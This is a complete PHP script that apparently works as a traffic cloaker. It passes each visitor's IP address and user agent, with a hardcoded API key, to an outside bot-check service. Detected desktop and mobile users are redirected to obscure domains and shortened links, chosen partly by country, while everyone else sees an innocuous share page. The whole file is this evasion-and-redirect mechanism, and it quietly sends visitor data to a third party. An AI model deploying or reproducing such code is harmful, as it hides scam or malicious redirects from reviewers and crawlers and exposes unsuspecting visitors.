<?php
  header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
  header('Access-Control-Allow-Methods: GET');
  header('X-Frame-Options: DENY');

  function getUserIP() {
      if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
          if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
              $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
              return trim($addr[0]);
          } else {
              return $_SERVER['HTTP_X_FORWARDED_FOR'];
          }
      }
      else {
          return $_SERVER['REMOTE_ADDR'];
      }
  }

  function generate_name($length){
      $rname = '';
      $sesli = 'aeiou';
      $sessiz = 'bcdfghjklmnprstvyz';
      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
      for($n=0;$n<$length;$n++){
          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
          }else{
              $rname .= $sesli[rand(0,strlen($sesli)-1)];
          }
      }
      return $rname;
  }

  function getApi(){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://redirect100.info/api/isBot?api_key=51fa5653d1986420acfc567f4a9826ac&i='.getUserIP().'&u='.$_SERVER["HTTP_USER_AGENT"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $org = curl_exec($ch);
    curl_close($ch);
    return json_decode($org);
  }

  $user = getApi();


  if ($user->status == true && $user->type == "DES") {
    header("Location: http://xkkdiqis.info/");
    exit;
  } else if ($user->status == true && $user->type == "MOB") {
    if ($user->country_code == "TR") {
      header('Location: https://goo.gl/O3CLpb');
    } else {
      header('Location: https://goo.gl/2lJlph');
    }
    exit;
  } else {
    @ob_end_clean();
    @ob_end_flush();
    //header("HTTP/1.1 301");
    require_once('share.php');
  }
?>
